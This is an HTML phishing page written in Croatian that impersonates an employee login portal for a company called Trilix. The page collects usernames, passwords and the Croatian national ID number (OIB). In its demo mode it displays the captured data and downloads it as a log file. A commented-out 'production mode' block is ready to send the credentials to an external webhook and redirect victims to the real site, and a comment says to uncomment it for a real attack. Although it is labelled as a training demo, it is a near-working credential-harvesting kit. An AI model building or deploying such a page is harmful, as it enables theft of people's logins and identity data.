<!DOCTYPE html>
<html lang="hr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Trilix • Prijava zaposlenih</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #1a2332; /* Trilix tamno plava pozadina */
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .login-container {
      background: #ffffff;
      border-radius: 8px;
      box-shadow: 0 4px 24px rgba(0,0,0,0.3);
      width: 420px;
      padding: 40px;
    }

    .logo {
      text-align: center;
      margin-bottom: 30px;
    }

    .logo h1 {
      font-size: 28px;
      color: #1a2332;
      font-weight: 700;
      letter-spacing: -0.5px;
    }

    .logo span {
      display: block;
      font-size: 13px;
      color: #6b7b8d;
      margin-top: 6px;
      font-weight: 400;
    }

    .form-group {
      margin-bottom: 20px;
    }

    .form-group label {
      display: block;
      font-size: 13px;
      color: #3d5a80;
      margin-bottom: 6px;
      font-weight: 600;
    }

    .form-group input {
      width: 100%;
      padding: 12px 14px;
      border: 1px solid #d1d9e6;
      border-radius: 6px;
      font-size: 15px;
      color: #1a2332;
      transition: border-color 0.2s, box-shadow 0.2s;
    }

    .form-group input:focus {
      outline: none;
      border-color: #2e86de;
      box-shadow: 0 0 0 3px rgba(46,134,222,0.15);
    }

    .btn-login {
      width: 100%;
      padding: 14px;
      background: #2e86de;
      color: #fff;
      border: none;
      border-radius: 6px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s;
      margin-top: 10px;
    }

    .btn-login:hover {
      background: #1b6dbf;
    }

    .footer-note {
      text-align: center;
      font-size: 12px;
      color: #8d99a6;
      margin-top: 24px;
      line-height: 1.5;
    }

    .alert-box {
      display: none;
      background: #e8f4fd;
      border-left: 4px solid #2e86de;
      padding: 16px;
      margin-top: 20px;
      border-radius: 4px;
      font-size: 13px;
      color: #1a2332;
    }

    .alert-box strong {
      display: block;
      margin-bottom: 8px;
      color: #2e86de;
    }

    .alert-box pre {
      background: #fff;
      padding: 10px;
      border-radius: 4px;
      font-size: 12px;
      overflow-x: auto;
      margin-top: 8px;
    }
  </style>
</head>
<body>

  <div class="login-container">
    <div class="logo">
      <h1>Trilix</h1>
      <span>Prijava zaposlenih • dsds.trilix.hr</span>
    </div>

    <form id="loginForm" onsubmit="simulatePhish(); return false;">
      <div class="form-group">
        <label for="user">Korisničko ime</label>
        <input type="text" id="user" name="user" placeholder="Unesite korisničko ime" required autocomplete="off">
      </div>

      <div class="form-group">
        <label for="pass">Lozinka</label>
        <input type="password" id="pass" name="pass" placeholder="Unesite lozinku" required>
      </div>

      <div class="form-group">
        <label for="oib">OIB (opcionalno)</label>
        <input type="text" id="oib" name="oib" placeholder="XX-XXXXXXXX-X">
      </div>

      <button type="submit" class="btn-login">Prijava</button>
    </form>

    <!-- Ovaj box se prikazuje nakon "prijave" — simulacija krađe -->
    <div id="alertBox" class="alert-box">
      <strong>⚠️ Demo: Prikupljeni podaci</strong>
      <span>Ovo je demonstracija phishing napada. U stvarnom scenariju, ovi podaci bi bili poslani napadaču.</span>
      <pre id="capturedData"></pre>
    </div>

    <p class="footer-note">
      © 2026 Trilix d.o.o. • Sva prava pridržana<br>
      Za tehničku podršku kontaktirajte IT sektor: <strong>it@trilix.hr</strong>
    </p>
  </div>

  <script>
    /* ═══════════════════════════════════════════
       POMOĆNA FUNKCIJA — Download log.txt fajla
       ═══════════════════════════════════════════ */
    function downloadFile(filename, textData) {
      const blob = new Blob([textData], { type: "text/plain" });
      const url  = URL.createObjectURL(blob);
      const a    = document.createElement("a");
      a.href        = url;
      a.download    = filename;
      a.style.display = "none";
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
    }

    function simulatePhish() {
      const user = document.getElementById('user').value;
      const pass = document.getElementById('pass').value;
      const oib  = document.getElementById('oib').value || '(nije unesen)';

      /* ───────── DEMO MODE (trening / prezentacija) ───────── */
      // Prikazuje prikupljene podatke na stranici
      const fakeDump = JSON.stringify({ username: user, password: pass, oib: oib }, null, 2);
      document.getElementById('capturedData').textContent = fakeDump;
      document.getElementById('alertBox').style.display = 'block';

      /* ───────── AUTOMATSKI DOWNLOAD log.txt ───────── */
      const logContent =
`=== Trilix Phish Demo Log ===
Timestamp : ${new Date().toISOString()}
Username  : ${user}
Password  : ${pass}
OIB       : ${oib}
-------------------------------
`;
      downloadFile("log.txt", logContent);

      /* ───────── PRODUCTION MODE (pravi napad) ───────── */
      // Otkomentiraj ispod kada želiš pravo slanje podataka:
      //
      // fetch('https://webhook.site/b13cdc16-7c9c-410d-b75a-252c760ee7d2', {
      //   method: 'POST',
      //   headers: { 'Content-Type': 'application/json' },
      //   body: JSON.stringify({ username: user, password: pass, oib: oib })
      // }).then(() => {
      //   window.location.href = 'https://dsds.trilix.hr';  // redirect na pravi sajt
      // });
    }
  </script>

</body>
</html>
